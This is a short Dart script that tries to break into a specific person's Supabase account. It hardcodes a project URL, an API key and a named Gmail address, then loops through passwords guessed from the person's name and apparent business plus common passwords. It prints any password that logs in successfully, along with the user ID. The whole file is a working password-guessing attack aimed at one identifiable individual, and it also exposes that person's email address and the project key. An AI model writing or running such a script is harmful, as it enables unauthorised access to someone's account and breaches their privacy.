import 'package:supabase/supabase.dart';

void main() async {
  final supabase = SupabaseClient(
    'https://napqcopzozmipkuzmdee.supabase.co',
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5hcHFjb3B6b3ptaXBrdXptZGVlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAzNDc4OTcsImV4cCI6MjA5NTkyMzg5N30.kDF_QNdBCQCMtnOANQdhGy5thF1T6RoBbewLX2IFA0o',
  );

  final email = 'serdaraydoqdu2@gmail.com';
  final pwds = [
    'password123', '123456', 'serdar123', 'Serdar123', 'serdaraydoqdu2',
    '12345678', '123456789', '1234567890', 'Aa123456', 'Aa123456!',
    'serdar', 'serdaray', 'serdaraydoqdu', 'depometrik', 'depometrik123',
    'Depometrik123', 'Depometrik123!', '1234567', '123456ab', '12345678ab',
    'password', 'qwerty', 'asdfgh', '123123', '123456!', '12345678!'
  ];

  for (final pwd in pwds) {
    try {
      final res = await supabase.auth.signInWithPassword(email: email, password: pwd);
      if (res.session != null) {
        print('SUCCESS! Password is: $pwd');
        print('User ID: ${res.user?.id}');
        return;
      }
    } catch (_) {}
  }
  print('Failed to find password in list.');
}
